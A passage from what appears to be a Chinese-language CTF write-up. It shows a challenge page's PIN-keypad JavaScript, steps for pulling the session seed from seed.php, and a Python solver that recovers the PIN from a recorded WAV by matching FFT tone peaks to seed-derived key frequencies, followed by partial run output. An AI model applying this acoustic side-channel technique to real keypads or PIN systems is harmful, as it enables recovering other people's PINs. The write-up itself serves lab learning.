kDecay = 18.0 + p.soundId * 0.65;</span><br><span class="line"></span><br><span class="line">    const osc1 = ctx.createOscillator();</span><br><span class="line">    const osc2 = ctx.createOscillator();</span><br><span class="line">    osc1.type = &quot;sine&quot;;</span><br><span class="line">    osc2.type = &quot;sine&quot;;</span><br><span class="line">    osc1.frequency.value = p.base;</span><br><span class="line">    osc2.frequency.value = p.base * (1.0 + (p.soundId - 5) * 0.00032);</span><br><span class="line"></span><br><span class="line">    const g = ctx.createGain();</span><br><span class="line">    g.gain.setValueAtTime(0.00001, now);</span><br><span class="line">    g.gain.setValueAtTime(0.00001, now + p.pre);</span><br><span class="line">    g.gain.linearRampToValueAtTime(1.0, now + p.pre + p.atk);</span><br><span class="line">    g.gain.setTargetAtTime(0.00001, now + p.pre + p.atk, 1.0 / kDecay);</span><br><span class="line"></span><br><span class="line">    const noiseBuf = ctx.createBuffer(1, Math.floor(ctx.sampleRate * 0.006), ctx.sampleRate);</span><br><span class="line">    &#123;</span><br><span class="line">      const d = noiseBuf.getChannelData(0);</span><br><span class="line">      for(let i=0;i&lt;d.length;i++)&#123;</span><br><span class="line">        const t = i / ctx.sampleRate;</span><br><span class="line">        const pulse = Math.sin(2*Math.PI*(2500 + p.soundId*37)*t + (p.soundId+1)*0.9);</span><br><span class="line">        const noise = (Math.sin(2*Math.PI*(9000 + p.soundId*11)*t) + Math.sin(2*Math.PI*(12000 + p.soundId*13)*t))*0.5;</span><br><span class="line">        const env = 1.0 - (t / 0.006);</span><br><span class="line">        d[i] = (0.62*pulse + 0.38*noise) * env * p.click * 0.85;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    const noiseSrc = ctx.createBufferSource();</span><br><span class="line">    noiseSrc.buffer = noiseBuf;</span><br><span class="line">    const noiseGain = ctx.createGain();</span><br><span class="line">    noiseGain.gain.value = 1.0;</span><br><span class="line"></span><br><span class="line">    const merger = ctx.createChannelMerger(2);</span><br><span class="line">    const splitter = ctx.createChannelSplitter(1);</span><br><span class="line">    const panL = ctx.createGain();</span><br><span class="line">    const panR = ctx.createGain();</span><br><span class="line">    panL.gain.value = leftGain * 0.85;</span><br><span class="line">    panR.gain.value = rightGain * 0.85;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    const mix = ctx.createGain();</span><br><span class="line">    mix.gain.value = 0.85;</span><br><span class="line"></span><br><span class="line">    osc1.connect(mix);</span><br><span class="line">    osc2.connect(mix);</span><br><span class="line">    mix.connect(g);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    g.connect(panL);</span><br><span class="line">    g.connect(panR);</span><br><span class="line">    panL.connect(merger, 0, 0);</span><br><span class="line">    panR.connect(merger, 0, 1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    noiseSrc.connect(noiseGain);</span><br><span class="line">    noiseGain.connect(merger, 0, 0);</span><br><span class="line">    noiseGain.connect(merger, 0, 1);</span><br><span class="line"></span><br><span class="line">    merger.connect(ctx.destination);</span><br><span class="line"></span><br><span class="line">    const startAt = now + p.pre;</span><br><span class="line">    const stopAt  = now + p.pre + p.dur;</span><br><span class="line"></span><br><span class="line">    noiseSrc.start(now); noiseSrc.stop(now + 0.006);</span><br><span class="line">    osc1.start(now); osc2.start(now);</span><br><span class="line">    osc1.stop(stopAt); osc2.stop(stopAt);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  async function pressDigit(d)&#123;</span><br><span class="line">    if(pin.length &gt;= MAX_LEN)&#123; setMsg(&quot;PIN 已满 6 位。&quot;, &quot;warn&quot;); return; &#125;</span><br><span class="line">    pin += String(d);</span><br><span class="line">    renderDots();</span><br><span class="line">    setMsg(&quot;&quot;);</span><br><span class="line">    const sid = map[d];</span><br><span class="line">    playSoundId(sid).catch(()=&gt;&#123;&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  function clearPin()&#123;</span><br><span class="line">    pin = &quot;&quot;;</span><br><span class="line">    renderDots();</span><br><span class="line">    setMsg(&quot;已清空。&quot;, &quot;warn&quot;);</span><br><span class="line">    playSoundId(SOUND_CANCEL).catch(()=&gt;&#123;&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">async function submitPin()&#123;</span><br><span class="line">  if(pin.length !== MAX_LEN)&#123; setMsg(&quot;请先输入 6 位 PIN。&quot;, &quot;warn&quot;); return; &#125;</span><br><span class="line"></span><br><span class="line">  const until = Number(localStorage.getItem(&quot;pin_cool_until&quot;) || &quot;0&quot;);</span><br><span class="line">  const now = Date.now();</span><br><span class="line">  if(until &gt; now)&#123;</span><br><span class="line">    const s = Math.ceil((until - now)/1000);</span><br><span class="line">    setMsg(`⏳ 冷却中，请 $&#123;s&#125;s 后再试。`, &quot;warn&quot;);</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  setMsg(&quot;正在验证…&quot;, &quot;warn&quot;);</span><br><span class="line">  playSoundId(SOUND_ENTER).catch(()=&gt;&#123;&#125;);</span><br><span class="line"></span><br><span class="line">  try&#123;</span><br><span class="line">    const resp = await fetch(&quot;/check.php&quot;, &#123;</span><br><span class="line">      method:&quot;POST&quot;,</span><br><span class="line">      headers:&#123; &quot;Content-Type&quot;:&quot;application/json&quot; &#125;,</span><br><span class="line">      body: JSON.stringify(&#123; pin &#125;)</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    const data = await resp.json().catch(()=&gt;null);</span><br><span class="line"></span><br><span class="line">    if(resp.status === 429)&#123;</span><br><span class="line">      const ra = Math.max(1, Number(data?.retry_after || data?.cd || 1));</span><br><span class="line">      const untilTs = Date.now() + ra*1000;</span><br><span class="line">      localStorage.setItem(&quot;pin_cool_until&quot;, String(untilTs));</span><br><span class="line">      setMsg(`⏳ 冷却中，请 $&#123;ra&#125;s 后再试。`, &quot;warn&quot;);</span><br><span class="line">      return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!resp.ok || !data)&#123;</span><br><span class="line">      setMsg(&quot;后端返回异常。&quot;, &quot;bad&quot;);</span><br><span class="line">      return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(data.ok)&#123;</span><br><span class="line">      localStorage.removeItem(&quot;pin_cool_until&quot;);</span><br><span class="line">      setMsg(&quot;✅ &quot; + (data.flag||&quot;&quot;), &quot;ok&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">      const cd = Number(data?.cd || 0);</span><br><span class="line">      if(cd &gt; 0)&#123;</span><br><span class="line">        localStorage.setItem(&quot;pin_cool_until&quot;, String(Date.now() + cd*1000));</span><br><span class="line">      &#125;</span><br><span class="line">      setMsg(&quot;❌ PIN incorrect.&quot;, &quot;bad&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;catch(e)&#123;</span><br><span class="line">    setMsg(&quot;网络错误。&quot;, &quot;bad&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  function mkBtn(label, cls, onClick)&#123;</span><br><span class="line">    const b = document.createElement(&quot;button&quot;);</span><br><span class="line">    b.className = &quot;key &quot; + cls;</span><br><span class="line">    b.textContent = label;</span><br><span class="line">    b.addEventListener(&quot;click&quot;, onClick);</span><br><span class="line">    return b;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  async function init()&#123;</span><br><span class="line">    renderDots();</span><br><span class="line">    setMsg(&quot;初始化会话映射…&quot;, &quot;warn&quot;);</span><br><span class="line">    await fetch(&quot;/init.php&quot;, &#123;cache:&quot;no-store&quot;&#125;).then(r=&gt;r.json());</span><br><span class="line"></span><br><span class="line">    const s = await fetch(&quot;/seed.php&quot;, &#123;cache:&quot;no-store&quot;&#125;).then(r=&gt;r.json());</span><br><span class="line">    if(!s || !s.ok)&#123; setMsg(&quot;seed 获取失败。&quot;, &quot;bad&quot;); return; &#125;</span><br><span class="line"></span><br><span class="line">    seed = s.seed;</span><br><span class="line">    map = await permute_0_9(seed);</span><br><span class="line"></span><br><span class="line">    dl.href = s.record_url;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    kbd.innerHTML = &quot;&quot;;</span><br><span class="line">    const layout = [</span><br><span class="line">      [&quot;1&quot;,&quot;2&quot;,&quot;3&quot;],</span><br><span class="line">      [&quot;4&quot;,&quot;5&quot;,&quot;6&quot;],</span><br><span class="line">      [&quot;7&quot;,&quot;8&quot;,&quot;9&quot;],</span><br><span class="line">      [&quot;cancel&quot;,&quot;0&quot;,&quot;enter&quot;],</span><br><span class="line">    ];</span><br><span class="line">    layout.flat().forEach(x=&gt;&#123;</span><br><span class="line">      if(x===&quot;cancel&quot;) kbd.appendChild(mkBtn(&quot;Cancel&quot;,&quot;fn cancel&quot;,clearPin));</span><br><span class="line">      else if(x===&quot;enter&quot;) kbd.appendChild(mkBtn(&quot;Enter&quot;,&quot;fn enter&quot;,submitPin));</span><br><span class="line">      else &#123;</span><br><span class="line">        const d = Number(x);</span><br><span class="line">        kbd.appendChild(mkBtn(x,&quot;&quot;,()=&gt;pressDigit(d)));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    document.getElementById(&quot;clear&quot;).onclick = clearPin;</span><br><span class="line">    document.getElementById(&quot;test&quot;).onclick = async ()=&gt;&#123;</span><br><span class="line">      setMsg(&quot;依次播放 0-9（当前会话）…&quot;, &quot;warn&quot;);</span><br><span class="line">      for(let d=0; d&lt;=9; d++)&#123;</span><br><span class="line">        await playSoundId(map[d]).catch(()=&gt;&#123;&#125;);</span><br><span class="line">        await new Promise(r=&gt;setTimeout(r, 120));</span><br><span class="line">      &#125;</span><br><span class="line">      setMsg(&quot;播放完成。&quot;, &quot;warn&quot;);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    window.addEventListener(&quot;keydown&quot;, (e)=&gt;&#123;</span><br><span class="line">      if(e.key&gt;=&quot;0&quot; &amp;&amp; e.key&lt;=&quot;9&quot;) pressDigit(Number(e.key));</span><br><span class="line">      if(e.key===&quot;Backspace&quot; || e.key===&quot;Escape&quot;) clearPin();</span><br><span class="line">      if(e.key===&quot;Enter&quot;) submitPin();</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    setMsg(&quot;等待输入 PIN…&quot;, &quot;warn&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  init().catch((e)=&gt;&#123;setMsg(&quot;初始化失败。&quot;,&quot;bad&quot;);console.log(e)&#125;);</span><br><span class="line">&#125;)();</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>在开始之前先F12-&gt;网络-&gt;seed.php找到你的seed,seed才能帮你算出你每个数字对应的频率：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;ok&quot;: true,</span><br><span class="line">    &quot;seed&quot;: &quot;44876bdf5f59431fd93dcda768b6901d&quot;,</span><br><span class="line">    &quot;token&quot;: &quot;8618941989c7f25c778de372835a2403&quot;,</span><br><span class="line">    &quot;record_url&quot;: &quot;\/record.php?token=8618941989c7f25c778de372835a2403&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面是全解密脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import numpy as np</span><br><span class="line">from scipy.io import wavfile</span><br><span class="line">import os</span><br><span class="line">import itertools</span><br><span class="line">from collections import defaultdict</span><br><span class="line"></span><br><span class="line"># ================= 配置区域 =================</span><br><span class="line"># 填入你最新的 Seed</span><br><span class="line">SEED = &quot;44876bdf5f59431fd93dcda768b6901d&quot;</span><br><span class="line"># 音频文件名</span><br><span class="line">WAV_FILE = &quot;record.wav&quot;</span><br><span class="line"># 预期的 PIN 码长度</span><br><span class="line">TARGET_PIN_LENGTH = 6</span><br><span class="line"># 输出多少个最可能的候选 PIN</span><br><span class="line">CANDIDATE_COUNT = 5</span><br><span class="line"># ### &lt;&lt;&lt; 改进点 &gt;&gt;&gt;</span><br><span class="line"># 当 ENTER 和 CANCEL 误差在此范围内时，优先选择 ENTER</span><br><span class="line">ENTER_BIAS_THRESHOLD_HZ = 3.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ===========================================</span><br><span class="line"></span><br><span class="line"># --- 原始模拟函数 (保持不变) ---</span><br><span class="line">def js_sha256_hex(s):</span><br><span class="line">    return hashlib.sha256(s.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def js_u32_from_hex8(h8):</span><br><span class="line">    b = bytes.fromhex(h8)</span><br><span class="line">    return (b[0] + (b[1] &lt;&lt; 8) + (b[2] &lt;&lt; 16) + (b[3] &lt;&lt; 24))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def prng_u32(seed, tag):</span><br><span class="line">    h = js_sha256_hex(seed + &quot;|&quot; + tag)</span><br><span class="line">    return js_u32_from_hex8(h[:8])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def permute_0_9(seed):</span><br><span class="line">    a = list(range(10))</span><br><span class="line">    x = prng_u32(seed, &quot;perm&quot;)</span><br><span class="line">    for i in range(9, 0, -1):</span><br><span class="line">        x = ((x * 1664525) &amp; 0xFFFFFFFF) + 1013904223</span><br><span class="line">        x = x &amp; 0xFFFFFFFF</span><br><span class="line">        j = x % (i + 1)</span><br><span class="line">        a[i], a[j] = a[j], a[i]</span><br><span class="line">    return a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_expected_freqs(seed):</span><br><span class="line">    mapping = permute_0_9(seed)</span><br><span class="line">    id_to_digit = &#123;v: k for k, v in enumerate(mapping)&#125;</span><br><span class="line">    id_to_digit[10] = &quot;CANCEL&quot;</span><br><span class="line">    id_to_digit[11] = &quot;ENTER&quot;</span><br><span class="line"></span><br><span class="line">    freq_table = &#123;&#125;</span><br><span class="line">    print(f&quot;🔑 正在计算 Seed [&#123;seed[:8]&#125;...] 的频率表:&quot;)</span><br><span class="line">    print(&quot;-&quot; * 40)</span><br><span class="line">    print(f&quot;&#123;&#x27;按键&#x27;:&lt;8&#125; | &#123;&#x27;SoundID&#x27;:&lt;8&#125; | &#123;&#x27;理论频率(Hz)&#x27;:&lt;15&#125;&quot;)</span><br><span class="line">    print(&quot;-&quot; * 40)</span><br><span class="line"></span><br><span class="line">    for sid in range(12):</span><br><span class="line">        x = prng_u32(seed, &quot;p&quot; + str(sid))</span><br><span class="line">        jitter = ((x &amp; 0xff) - 128) * 0.35</span><br><span class="line">        freq = 1050 + sid * 23 + jitter</span><br><span class="line">        digit = id_to_digit.get(sid)</span><br><span class="line">        freq_table[sid] = &#123;&quot;freq&quot;: freq, &quot;key&quot;: str(digit)&#125;</span><br><span class="line">        print(f&quot;[&#123;str(digit):&lt;6&#125;] | &#123;sid:&lt;8&#125; | &#123;freq:.2f&#125;&quot;)</span><br><span class="line">    print(&quot;-&quot; * 40)</span><br><span class="line">    return freq_table</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class DetectedPress:</span><br><span class="line">    def __init__(self, index, peak_freq):</span><br><span class="line">        self.index = index</span><br><span class="line">        self.peak_freq = peak_freq</span><br><span class="line">        self.candidates = []</span><br><span class="line">        self.best_match = None</span><br><span class="line">        self.confidence = 0.0</span><br><span class="line">        self.correction_applied = False  # 标记是否被修正过</span><br><span class="line"></span><br><span class="line">    def calculate_candidates(self, freq_table):</span><br><span class="line">        for sid, info in freq_table.items():</span><br><span class="line">            error = abs(self.peak_freq - info[&#x27;freq&#x27;])</span><br><span class="line">            confidence = 1.0 / (1.0 + error / 10.0)</span><br><span class="line">            self.candidates.append((info[&#x27;key&#x27;], error, confidence))</span><br><span class="line"></span><br><span class="line">        self.candidates.sort(key=lambda x: x[1])  # 按误差升序排序</span><br><span class="line"></span><br><span class="line">        # ### &lt;&lt;&lt; 改进点: 优先选择 ENTER 的逻辑 &gt;&gt;&gt;</span><br><span class="line">        # 检查最佳匹配是否为 CANCEL，次佳是否为 ENTER</span><br><span class="line">        if len(self.candidates) &gt; 1:</span><br><span class="line">            best_match, best_error, _ = self.candidates[0]</span><br><span class="line">            second_match, second_error, _ = self.candidates[1]</span><br><span class="line"></span><br><span class="line">            # 如果最佳是CANCEL，次佳是ENTER，且误差差异不大</span><br><span class="line">            if best_match == &#x27;CANCEL&#x27; and second_match == &#x27;ENTER&#x27; and \</span><br><span class="line">                    abs(best_error - second_error) &lt; ENTER_BIAS_THRESHOLD_HZ:</span><br><span class="line">                # 交换它们！优先选择 ENTER</span><br><span class="line">                self.candidates[0], self.candidates[1] = self.candidates[1], self.candidates[0]</span><br><span class="line">                self.correction_applied = True  # 标记此修正</span><br><span class="line"></span><br><span class="line">        # 更新最终选择</span><br><span class="line">        if self.candidates:</span><br><span class="line">            self.best_match = self.candidates[0][0]</span><br><span class="line">            self.confidence = self.candidates[0][2]</span><br><span class="line"></span><br><span class="line">    def __repr__(self):</span><br><span class="line">        return (f&quot;Press(idx=&#123;self.index&#125;, key=&#x27;&#123;self.best_match&#125;&#x27;, &quot;</span><br><span class="line">                f&quot;conf=&#123;self.confidence:.2f&#125;, peak=&#123;self.peak_freq:.2f&#125;Hz)&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def analyze_audio_to_presses(filepath, freq_table):</span><br><span class="line">    if not os.path.exists(filepath):</span><br><span class="line">        print(f&quot;❌ 错误: 找不到文件 &#123;filepath&#125;&quot;)</span><br><span class="line">        return []</span><br><span class="line"></span><br><span class="line">    print(f&quot;\n🎧 正在分析音频: &#123;filepath&#125; ...&quot;)</span><br><span class="line">    try:</span><br><span class="line">        samplerate, data = wavfile.read(filepath)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;❌ 读取音频失败: &#123;e&#125;&quot;)</span><br><span class="line">        return []</span><br><span class="line"></span><br><span class="line">    if len(data.shape) &gt; 1: data = data[:, 0]</span><br><span class="line"></span><br><span class="line">    window_size, threshold_factor, min_duration = 1024, 0.2, 2000</span><br><span class="line">    threshold = np.max(np.abs(data)) * threshold_factor</span><br><span class="line">    active_regions = []</span><br><span class="line">    in_region, start_idx = False, 0</span><br><span class="line">    for i in range(0, len(data), window_size):</span><br><span class="line">        chunk = data[i:i + window_size]</span><br><span class="line">        if np.max(np.abs(chunk)) &gt; threshold:</span><br><span class="line">            if not in_region:</span><br><span class="line">                start_idx = i</span><br><span class="line">                in_region = True</span><br><span class="line">        elif in_region:</span><br><span class="line">            if i - start_idx &gt; min_duration:</span><br><span class="line">                active_regions.append((start_idx, i))</span><br><span class="line">            in_region = False</span><br><span class="line"></span><br><span class="line">    if in_region and len(data) - start_idx &gt; min_duration:</span><br><span class="line">        active_regions.append((start_idx, len(data)))</span><br><span class="line"></span><br><span class="line">    detected_presses = []</span><br><span class="line">    print(&quot;\n👇 识别到的原始按键信号:&quot;)</span><br><span class="line">    for i, (start, end) in enumerate(active_regions):</span><br><span class="line">        segment = data[start:end] * np.hanning(end - start)</span><br><span class="line">        fft_out = np.fft.rfft(segment)</span><br><span class="line">        freqs = np.fft.rfftfreq(len(segment), 1.0 / samplerate)</span><br><span class="line"></span><br><span class="line">        idx = np.argmax(np.abs(fft_out))</span><br><span class="line">        peak_freq = freqs[idx]</span><br><span class="line"></span><br><span class="line">        press = DetectedPress(index=i, peak_freq=peak_freq)</span><br><span class="line">        press.calculate_candidates(freq_table)</span><br><span class="line">        detected_presses.append(press)</span><br><span class="line"></span><br><span class="line">        # 打印更丰富的调试信息</span><br><span class="line">        print(f&quot;  🎵 信号 &#123;i&#125;: &#123;peak_freq:.2f&#125; Hz&quot;)</span><br><span class="line"></span><br><span class="line">        # ### &lt;&lt;&lt; 改进点: 如果发生了修正，明确地打印出来 &gt;&gt;&gt;</span><br><span class="line">        if press.correction_applied:</span><br><span class="line">            original_best, original_err, _ = press.candidates[1]  # 原来的最佳现在是老二</span><br><span class="line">            corrected_best, corrected_err, _ = press.candidates[0]  # 现在的老大</span><br><span class="line">            print(f&quot;     - ⚠️ 智能修正: 从 [&#123;original_best&#125;] (误差 &#123;original_err:.2f&#125;Hz) &quot;</span><br><span class="line">                  f&quot;修正为 [&#123;corrected_best&#125;] (误差 &#123;corrected_err:.2f&#125;Hz)&quot;)</span><br><span class="line">        else:</span><br><span class="line">            best_key, error, conf = press.candidates[0]</span><br><span class="line">            second_best_key, second_error, _ = press.candidates[1]</span><br><span class="line">            print(f&quot;     - 最佳匹配: [&#123;best_key&#125;] (误差 &#123;error:.2f&#125;Hz, 置信度 &#123;conf:.2f&#125;)&quot;)</span><br><span class="line">            print(f&quot;     - 次佳匹配: [&#123;second_best_key&#125;] (误差 &#123;second_error:.2f&#125;Hz)&quot;)</span><br><span class="line"></span><br><span class="line">    return detected_presses</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># --- generate_candidates 和 solve 函数保持不变 ---</span><br><span class="line"># (因为我们修正了输入数据，下游算法不需要改动)</span><br><span class="line"></span><br><span class="line">def generate_candidates(session, target_len):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    根据启发式规则生成候选 PIN</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    candidates = defaultdict(lambda: &#123;&quot;score&quot;: 0, &quot;reason&quot;: &quot;&quot;&#125;)</span><br><span class="line">    session_len = len(session)</span><br><span class="line"></span><br><span class="line">    if session_len &gt; target_len:</span><br><span class="line">        num_to_delete = session_len - target_len</span><br><span class="line">        sorted_session = sorted(session, key=lambda p: p.confidence)</span><br><span class="line">        to_delete = sorted_session[:num_to_delete]</span><br><span class="line">        to_keep = sorted(set(session) - set(to_delete), key=lambda p: p.index)</span><br><span class="line">        pin = &quot;&quot;.join([p.best_match for p in to_keep])</span><br><span class="line">        score = np.mean([p.confidence for p in to_keep])</span><br><span class="line">        if score &gt; candidates[pin][&quot;score&quot;]:</span><br><span class="line">            candidates[pin] = &#123;&quot;score&quot;: score, &quot;reason&quot;: f&quot;剔除 &#123;num_to_delete&#125; 个低置信度按键&quot;&#125;</span><br><span class="line"></span><br><span class="line">    low_conf_presses = sorted(session, key=lambda p: p.confidence)[:3]</span><br><span class="line">    for press_to_correct in low_conf_presses:</span><br><span class="line">        temp_session = list(session)</span><br><span class="line">        corrected_press_idx = session.index(press_to_correct)</span><br><span class="line">        if len(press_to_correct.candidates) &lt; 2: continue</span><br><span class="line"></span><br><span class="line">        corrected_key, _, corrected_confidence = press_to_correct.candidates[1]</span><br><span class="line"></span><br><span class="line">        corrected_press = DetectedPress(press_to_correct.index, press_to_correct.peak_freq)</span><br><span class="line">        corrected_press.best_match = corrected_key</span><br><span class="line">        corrected_press.confidence = corrected_confidence</span><br><span class="line"></span><br><span class="line">        temp_session[corrected_press_idx] = corrected_press</span><br><span class="line"></span><br><span class="line">        if len(temp_session) == target_len:</span><br><span class="line">            pin = &quot;&quot;.join([p.best_match for p in temp_session])</span><br><span class="line">            score = np.mean([p.confidence for p in temp_session])</span><br><span class="line">            if score &gt; candidates[pin][&quot;score&quot;]:</span><br><span class="line">                candidates[pin] = &#123;&quot;score&quot;: score,</span><br><span class="line">                                   &quot;reason&quot;: f&quot;修正按键 &#123;press_to_correct.index&#125; (从 &#123;press_to_correct.best_match&#125; -&gt; &#123;corrected_key&#125;)&quot;&#125;</span><br><span class="line"></span><br><span class="line">        elif len(temp_session) &gt; target_len:</span><br><span class="line">            num_to_delete = len(temp_session) - target_len</span><br><span class="line">            sorted_temp = sorted(temp_session, key=lambda p: p.confidence)</span><br><span class="line">            to_delete = sorted_temp[:num_to_delete]</span><br><span class="line">            to_keep = sorted(set(temp_session) - set(to_delete), key=lambda p: p.index)</span><br><span class="line">            pin = &quot;&quot;.join([p.best_match for p in to_keep])</span><br><span class="line">            score = np.mean([p.confidence for p in to_keep])</span><br><span class="line">            if score &gt; candidates[pin][&quot;score&quot;]:</span><br><span class="line">                candidates[pin] = &#123;&quot;score&quot;: score,</span><br><span class="line">                                   &quot;reason&quot;: f&quot;修正按键 &#123;press_to_correct.index&#125; + 剔除 &#123;num_to_delete&#125; 个&quot;&#125;</span><br><span class="line"></span><br><span class="line">    if session_len == target_len:</span><br><span class="line">        pin = &quot;&quot;.join([p.best_match for p in session])</span><br><span class="line">        score = np.mean([p.confidence for p in session])</span><br><span class="line">        if score &gt; candidates[pin][&quot;score&quot;]:</span><br><span class="line">            candidates[pin] = &#123;&quot;score&quot;: score, &quot;reason&quot;: &quot;原始识别序列&quot;&#125;</span><br><span class="line"></span><br><span class="line">    return candidates</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def solve():</span><br><span class="line">    ref_table = get_expected_freqs(SEED)</span><br><span class="line">    presses = analyze_audio_to_presses(WAV_FILE, ref_table)</span><br><span class="line"></span><br><span class="line">    if not presses:</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    sessions = []</span><br><span class="line">    current_session = []</span><br><span class="line">    for press in presses:</span><br><span class="line">        if press.best_match == &#x27;ENTER&#x27;:</span><br><span class="line">            if current_session:</span><br><span class="line">                sessions.append(current_session)</span><br><span class="line">            current_session = []</span><br><span class="line">        elif press.best_match != &#x27;CANCEL&#x27;:</span><br><span class="line">            current_session.append(press)</span><br><span class="line">    if current_session:</span><br><span class="line">        sessions.append(current_session)</span><br><span class="line"></span><br><span class="line">    print(&quot;\n&quot; + &quot;=&quot; * 30)</span><br><span class="line">    print(&quot;🧠 正在进行智能推理...&quot;)</span><br><span class="line">    print(&quot;=&quot; * 30)</span><br><span class="line"></span><br><span class="line">    all_candidates = &#123;&#125;</span><br><span class="line">    for i, session in enumerate(sessions):</span><br><span class="line">        if not session: continue</span><br><span class="line"></span><br><span class="line">        raw_keys = &quot; &quot;.join([p.best_match for p in session])</span><br><span class="line">        print(f&quot;\n分析会话 &#123;i + 1&#125; (长度 &#123;len(session)&#125;): [&#123;raw_keys&#125;]&quot;)</span><br><span class="line"></span><br><span class="line">        session_candidates = generate_candidates(session, TARGET_PIN_LENGTH)</span><br><span class="line">        for pin, info in session_candidates.items():</span><br><span class="line">            if info[&quot;score&quot;] &gt; all_candidates.get(pin, &#123;&quot;score&quot;: -1&#125;)[&quot;score&quot;]:</span><br><span class="line">                all_candidates[pin] = info</span><br><span class="line"></span><br><span class="line">    if not all_candidates:</span><br><span class="line">        print(&quot;\n❌ 未能生成任何长度合理的候选 PIN。&quot;)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    sorted_pins = sorted(all_candidates.items(), key=lambda item: item[1][&#x27;score&#x27;], reverse=True)</span><br><span class="line"></span><br><span class="line">    print(&quot;\n&quot; + &quot;=&quot; * 40)</span><br><span class="line">    print(&quot;🎉 最终候选 PIN 码 (按可能性排序):&quot;)</span><br><span class="line">    print(&quot;=&quot; * 40)</span><br><span class="line">    for i, (pin, info) in enumerate(sorted_pins[:CANDIDATE_COUNT]):</span><br><span class="line">        print(f&quot;#&#123;i + 1&#125;: &#123;pin&#125;&quot;)</span><br><span class="line">        print(f&quot;   - 置信度: &#123;info[&#x27;score&#x27;]:.3f&#125;&quot;)</span><br><span class="line">        print(f&quot;   - 推理依据: &#123;info[&#x27;reason&#x27;]&#125;&quot;)</span><br><span class="line">        print(&quot;-&quot; * 20)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    solve()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这个脚本有瑕疵，他确实会把你用seed计算的频率和从wav中识别的频率进行对比但是对cancel和enter的处理不好请运行完脚本后人工处理，例如我的运行结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\py\python.exe C:\Users\Lenovo\Desktop\ctf\rsa_xor_decrypt.py </span><br><span class="line">🔑 正在计算 Seed [44876bdf...] 的频率表:</span><br><span class="line">----------------------------------------</span><br><span class="line">按键       | SoundID  | 理论频率(Hz)       </span><br><span class="line">----------------------------------------</span><br><span class="line">[4     ] | 0        | 1008.00</span><br><span class="line">[9     ] | 1        | 1044.30</span><br><span class="line">[2     ] | 2        | 1066.25</span><br><span class="line">[3     ] | 3        | 1101.85</span><br><span class="line">[0     ] | 4        | 1175.95</span><br><span class="line">[6     ] | 5        | 1188.10</span><br><span class="line">[1     ] | 6        | 1153.35</span><br><span class="line">[8     ] | 7        | 1193.50</span><br><span class="line">[7     ] | 8        | 1208.80</span><br><span class="line">[5     ] | 9        | 1254.90</span><br><span class="line">[CANCEL] | 10       | 1266.00</span><br><span class="line">[ENTER ] | 11       | 1276.75</span><br><span class="line">----------------------------------------</span><br><span class="line"></span><br><span class="line">🎧 正在分析音频: record.wav ...</span><br><span class="line"></span><br><span class="line">👇 识别到的原始按键信号:</span><br><span class="line">  🎵 信号 0: 1007.75 Hz</span><br><span class="line">     - 最佳匹配: [4] (误差 0.25Hz, 置信度 0.98)</span><br><span class="line">     - 次佳匹配: [9] (误差 36.55Hz)</span><br><span class="line">  🎵 信号 1: 1152.03 Hz</span><br><span class="line">     - 最佳匹配: [1] (误差 1.32Hz, 置信度 0.88)</span><br><span class="line">     - 次佳匹配: [0] (误差 23.92Hz)</span><br><span class="line">  🎵 信号 2: 1184.33 Hz</span><br><span class="line">     - 最佳匹配: [6] (误差 3.77Hz, 置信度 0.73)</span><br><span class="line">     - 次佳匹配: [0] (误差 8.38Hz)</span><br><span class="line">  🎵 信号 3: 1270.46 Hz</span><br><span class="line">     - ⚠️ 智能修正: 从 [CANCEL] (误差 4.46Hz) 修正为 [ENTER] (误差 6.29Hz)</span><br><span class="line">  🎵 信号 4: 1007.75 Hz</span><br><span class="line">     - 最佳匹配: [4] (误差 0.25Hz, 置信度 